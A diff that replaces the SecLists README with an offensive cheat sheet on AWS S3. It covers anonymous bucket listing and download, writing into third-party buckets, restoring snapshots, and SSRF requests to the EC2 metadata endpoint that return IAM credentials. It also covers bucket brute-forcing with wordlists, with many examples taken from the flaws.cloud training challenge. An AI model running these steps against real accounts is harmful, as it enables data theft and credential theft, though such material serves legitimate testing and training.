@@ -1,61 +1,119 @@
-![seclists.png](https://danielmiessler.com/images/seclists-long.png "seclists.png")
+# Amazon Bucket S3 AWS
+Prerequisites, at least you need awscli
+```
+sudo apt install awscli
+```
+You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential
+but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/
+```
+aws configure
+AWSAccessKeyId=[ENTER HERE YOUR KEY]
+AWSSecretKey=[ENTER HERE YOUR KEY]
+```
+```
+aws configure --profile nameofprofile
+```
 
-# About
+then you can use *--profile nameofprofile* in the aws command
 
-SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more. The goal is to enable a security tester to pull this repo onto a new testing box and have access to every type of list that may be needed.
+By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names
+```
+http://s3.amazonaws.com/[bucket_name]/
+http://[bucket_name].s3.amazonaws.com/
+http://flaws.cloud.s3.amazonaws.com/
+```
 
-This project is maintained by [Daniel Miessler](http://www.danielmiessler.com/ "Daniel Miessler") and [Jason Haddix](http://www.securityaegis.com "Jason Haddix").
+## Basic test - Listing the files
+```bash
+aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here
+aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
+```
+You can get the region with a dig and nslookup
+```bash
+$ dig flaws.cloud
+;; ANSWER SECTION:
+flaws.cloud.		5	IN	A	52.218.192.11
 
-## Contributing
+$ nslookup 52.218.192.11
+Non-authoritative answer:
+11.192.218.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
+```
 
-If you have any ideas for things we should include, please use one of the following methods to submit them:
 
-1. Send us pull requests
-2. Create an issue in the project (right side)
-3. Send us links through the issues feature, and we'll parse and incorporate them
-3. Email daniel.miessler@owasp.org or jason.haddix@owasp.org with content to add
+## Move a file into the bucket
+```
+aws s3 mv test.txt s3://hackerone.marketing
+FAIL : "move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied."
 
-Significant effort is made to give attribution for these lists whenever possible, and if you are a list owner or know who the original author/curator is, please let us know so we can give proper credit.
+aws s3 mv test.txt s3://hackerone.files
+SUCCESS : "move: ./test.txt to s3://hackerone.files/test.txt"
+```
 
-### Attribution
+## Download every things (in an open bucket)
+```
+aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
+```
 
-- Adam Muntner and for the FuzzDB content, including all authors from the FuzzDB project (https://github.com/fuzzdb-project/fuzzdb)
-- Ron Bowes of SkullSecurity for collaborating and including all his lists here (https://wiki.skullsecurity.org/Passwords)
-- Clarkson University for their research that led to the Clarkson list
-- All the authors listed in the XSS with context doc, which was found on pastebin and added to by us
-- Ferruh Mavitina for the beginnings of the LFI Fuzz list
-- Kevin Johnson for laudnaum shells (https://sourceforge.net/projects/laudanum/)
-- RSnake for fierce hostname list
-- Charlie Campbell for Spanish word list, numerous other contributions
-- Rob Fuller for the IZMY list
-- Mark Burnett for the 10 million passwords list
-- @shipCod3 for an SSH user/pass list
-- Steve Crapo for doing splitting work on a number of large lists
-- Thanks to Blessen Thomas for recommending Mario's/cure53's XSS vectors
-- Thanks to Danny Chrastil for submitting an anonymous JSON fuzzing list
-- Many thanks to @geekspeed, @EricSB, @lukebeer, @patrickmollohan, @g0tmi1k, @albinowax, and @kurobeats for submitting via pull requests
-- Special thanks to @shipcod3 for MANY contributions!
-- Thanks to Samar Dhwoj Acharya for allowing his Github Dorks content to be included!
-- Thanks to Liam Somerville for the excellent list of default passwords
-- Great thanks to Michael Henriksen for allowing us to include his Gitrob project's signatures
-- Honored to have @Brutelogic's brilliant XSS Cheatsheet added to the Fuzzing section!
-- 0xsobky's Ultimate XSS Polyglot!
-- @otih for bruteforce collected username and password lists
-- @govolution for betterdefaultpasslist (https://github.com/govolution/betterdefaultpasslist)
-- Max Woolf (@minimaxir) for **big-list-of-naughty-strings** (https://github.com/minimaxir/big-list-of-naughty-strings) [`/Fuzzing/big-list-of-naughty-strings.txt`]
-- Ian Gallagher (@craSH) for **http-request-headers** [`/Miscellaneous/http-request-headers/`]
-- Arvind Doraiswamy (@arvinddoraiswamy) for **numeric-fields-only** [`/Fuzzing/numeric_fields_only.txt`]
-- @badibouzouk for **Domino Hunter** (https://sourceforge.net/projects/dominohunter/) [`/Discovery/Web-Content/Domino-Hunter/`]
-- @coldfusion39 for **domi-owned** (https://github.com/coldfusion39/domi-owned) [`/Discovery/Web-Content/domino-*-coldfusion39.txt`]
+## Check bucket disk size (authenticated) use, --no-sign for un-authenticated 
+```
+aws s3 ls s3://<bucketname> --recursive  | grep -v -E "(Bucket: |Prefix: |LastWriteTime|^$|--)" | awk 'BEGIN {total=0}{total+=$3}END{print total/1024/1024" MB"}'
+```
 
-This project stays great because of care and love from the community, and we will never forget that.
+## AWS - Extract Backup
+```
+aws --profile flaws sts get-caller-identity
+"Account": "XXXX26262029",
 
-## Licensing
+aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
+"SnapshotId": "snap-XXXX342abd1bdcb89",
 
-This project is licensed under the MIT license.
+Create a volume using snapshot
+aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
+In Aws Console -> EC2 -> New Ubuntu
+chmod 400 YOUR_KEY.pem
+ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
 
-![MIT License](https://danielmiessler.com/images/mitlicense.png)
+Mount the volume
+lsblk
+sudo file -s /dev/xvda1
+sudo mount /dev/xvda1 /mnt
+```
 
-—
 
-<sup>NOTE: Downloading this repository is likely to cause a false-positive alarm by your antivirus or antimalware software, the filepath should be whitelisted. There is nothing in Seclists or FuzzDB that can harm your computer as-is, however it's not recommended to store these files on a server or other important system due to the risk of local file include attacks.</sup>
+## Bucket informations
+Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting :
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token
+```
+For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+
+## Bucket Finder
+A cool tool that will search for readable buckets and list all the files in them. It can also be used to quickly find buckets that exist but deny access to listing files.
+```
+wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2
+./bucket_finder.rb my_words
+./bucket_finder.rb --region ie my_words
+	US Standard         = http://s3.amazonaws.com
+	Ireland             = http://s3-eu-west-1.amazonaws.com
+	Northern California = http://s3-us-west-1.amazonaws.com
+	Singapore           = http://s3-ap-southeast-1.amazonaws.com
+	Tokyo               = http://s3-ap-northeast-1.amazonaws.com
+
+./bucket_finder.rb --download --region ie my_words
+./bucket_finder.rb --log-file bucket.out my_words
+```
+Use a custom wordlist for the bucket finder, can be created with
+```
+List of Fortune1000 company names with permutations on .com, -backup, -media. For example, walmart becomes walmart, walmart.com, walmart-backup, walmart-media.
+List of the top Alexa 100,000 sites with permutations on the TLD and www. For example, walmart.com becomes www.walmart.com, www.walmart.net, walmart.com, and walmart.
+```
+
+
+## Thanks to
+* https://community.rapid7.com/community/infosec/blog/2013/03/27/1951-open-s3-buckets
+* https://digi.ninja/projects/bucket_finder.php
+* [Bug Bounty Survey - AWS Basic test](https://twitter.com/bugbsurveys/status/859389553211297792)
+* [FlAWS.cloud Challenge based on AWS vulnerabilities](http://flaws.cloud/)
+* https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/
